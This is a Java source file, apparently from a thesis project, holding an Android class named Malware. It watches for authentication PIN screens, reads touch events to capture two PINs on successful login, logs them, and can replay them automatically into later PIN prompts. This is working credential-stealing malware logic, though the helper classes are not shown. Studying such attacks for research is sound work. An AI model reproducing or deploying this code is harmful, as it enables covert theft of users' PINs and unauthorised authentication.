package com.example.thesis;

import android.content.Context;
import android.util.Log;

import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.LinkedList;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: dictionary for buttons, instead of list.
    // TODO: maybe run certain activity after every event is recieved. For example from ImageService.

    final private EventReader eventReader;
    final private DisplayedScreenService displayedScreenService;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private Queue<Integer> PIN1;
    private Queue<Integer> PIN2;

    private DisplayedScreen whichPINscreen = DisplayedScreen.OTHER;

    private boolean autoEnterPIN = false;

    public Malware(Context context) {
        this.displayedScreenService = new DisplayedScreenService(context);
        this.eventReader = new EventReader();

        this.PIN1 = new LinkedList<>();
        this.PIN2 = new LinkedList<>();
    }


    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.displayedScreenService.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        while (keepRunning()) {
            DisplayedScreen currentScreen = displayedScreenService.getCurrentScreen();
            if (!autoEnterPIN) {
                if (DisplayedScreen.OTHER != currentScreen) {
                    if (!eventReaderRunning) {
                        startListeningEvents();
                    }
                    malwareCode(currentScreen);
                } else if (eventReaderRunning) {
                    stopListeningEvents();

                    if (whichPINscreen == DisplayedScreen.AUTH_PIN_1) {
                        // TODO: this if statement is for testing, remove later!
                        Log.i("PIN1", getPIN().toString());
                    }
                }
            } else if (!PIN1.isEmpty() && !PIN2.isEmpty()) {
                if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
                    displayedScreenService.sendPIN(PIN1);
                } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
                    displayedScreenService.sendPIN(PIN2);
                }
            } else {
                // Somehow auto enter pin is enabled when not knowing the PIN's, make it impossible.
            }


            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Malware", "Run loop interrupted!");
            }
        }
    }


    private void malwareCode(DisplayedScreen currentScreen) {
        if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_1;
        } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_2;
        } else if (currentScreen == DisplayedScreen.AUTH_SUCCESS) {
            if (whichPINscreen == DisplayedScreen.AUTH_PIN_1) {
                PIN1 = getPIN();
            } else if (whichPINscreen == DisplayedScreen.AUTH_PIN_2) {
                PIN2 = getPIN();
            }
        } else if (currentScreen == DisplayedScreen.AUTH_FAILED) {
            getPIN();
        }
    }


    private void startListeningEvents() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader, "EventReader Thread");
        eventReaderThread.start();
        eventReaderRunning = true;
    }


    private void stopListeningEvents() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    /**
     * Empties touchevents also.
     * @return
     */
    private Queue<Integer> getPIN() {
        Queue<Event> touchEvents = eventReader.getTouchEvents();
        return displayedScreenService.extractPIN(touchEvents);
    }



}



